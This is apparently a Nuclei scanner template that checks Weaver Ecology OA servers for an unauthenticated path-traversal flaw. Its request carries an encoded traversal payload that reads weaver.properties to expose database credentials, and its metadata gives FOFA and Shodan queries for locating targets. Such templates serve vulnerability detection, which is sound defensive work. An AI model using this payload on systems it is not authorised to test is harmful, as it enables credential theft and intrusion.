http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - ecology.password
    - ecology.charset
  - part: header
    type: word
    words:
    - text/plain
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_%2f%2e%2e%2fweaver%2eproperties'
id: ecology-info-leak
info:
  author: qianbenhyu
  description: 'The "ecology" component exposes a file that contains sensitive database
    credentials (dbuser/dbpass).

    '
  metadata:
    fofa-query: "app=\"\u6CDB\u5FAE-\u534F\u540C\u529E\u516COA\""
    max-request: 1
    shodan-query: ecology_JSessionid
    verified: true
  name: Ecology - Information Exposure
  reference:
  - https://github.com/xinyisleep/pocscan/blob/main/%E6%B3%9B%E5%BE%AE/oa%E6%B3%9B%E5%BE%AE0day%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.py
  severity: high
  tags: ecology,unauth,misconfig,vuln
